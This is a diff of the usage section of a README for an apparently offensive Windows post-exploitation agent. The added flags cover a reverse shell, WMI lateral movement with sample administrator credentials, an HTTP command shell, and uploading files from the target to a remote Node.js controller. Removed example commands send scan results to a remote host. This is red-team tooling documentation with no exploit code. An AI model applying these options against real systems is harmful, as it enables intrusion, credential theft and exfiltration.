@@ -38,32 +38,29 @@ by using windows update api, agent will able to identify the following vulnerabi
 
 ### Usage 
 ```
--s --Enumerate Active Windows Services , Drivers  ..etc .
--u --Getting information about Users , groups , Roles , Releated information .
--c --Search for Senstive Config files Accessible & Private stuff .
--n --Retrieve Network information,interfaces ...etc .
--w --Enumerate for Writeable Directories , Access Permission Check , Modified Permissions.
--i --Enumerate Windows System information , Sessions , Releated information.
--l --Search in Any File by Specific Keywork , ex : agent.exe -l c:\ password *.config.
--o --Connect to 0xsp Mongoose Web Application API.
--p --Enumerate installed Softwares , Running Processes, Tasks .
--e --Kernel inspection Tool, it will help to search through tool databases for windows kernel vulnerabilities
--x --Secret Key to authorize your connection with WebApp.
--d --Download Files directly into Target Machine .
--t --Upload Files From Target Machine into Mongoose Web Application API. [agent.exe -t filename api secretkey]
--m --Run All Known Scan Types together .
+-s --retrieve windows services and installed drivers.
+-u --retrieve information about Users, groups, roles.
+-c --search for senstive config files by extension.
+-n --retrieve network information,network interfaces, connection details.
+-w --enumerate for writeable directories, access permission Check, modified permissions.
+-i --enumerate windows system information, Sessions, log information.
+-l --search in any file for specific string , ex : agent.exe -l c:\ password *.config.
+-o --specify host address of nodejs application.
+-p --enumerate installed Softwares, Running Processes, Tasks .
+-e --kernel inspection Tool, it will help to search through tool databases for windows kernel vulnerabilities
+-x --password to authorize your connection with node js application.
+-d --download Files directly into Target Machine .
+-t --upload Files From target machine into node js application.
+-m --run all known scan Types together .
+
+-r --spawn a reverse shell with specific account .
+-lr --Lateral movement technique using WMI (e.g -lr -host 192.168.14.1 -username administrator -password blabla -srvhost nodejsip )
+-nds --network discovery and share enumeration
+-cmd --transfer commands via HTTP Shell
+-interactive --starting interactive mode (eg : loading plugins ..etc)
+-username --identity authentication for specific attack modules.
+-password --identity authentication for specific attack modules.
+-host --identify remote host to conduct an attack to.
+-srvhost --set rhost of node js application.(bidirectional communications).
 ```
 
-```
-./agent {SCAN OPTION} -o localhost -x secretkey
-```
-
-
-### export results into node js api   
-
-```
-./agent -c -o localhost -x 0xsp { enumerate for CRON Tasks and Transfer results into Web Api} 
-./agent -e -o localhost -x 0xsp { intelligent Exploits Detector }
-./agent -c -e localhost -x 0sxp { will run two scans together and send found results directly }
-./agent -m -o 10.10.13.1 -x 0xsp { RUN all Scans together and export it to Web API} 
-```
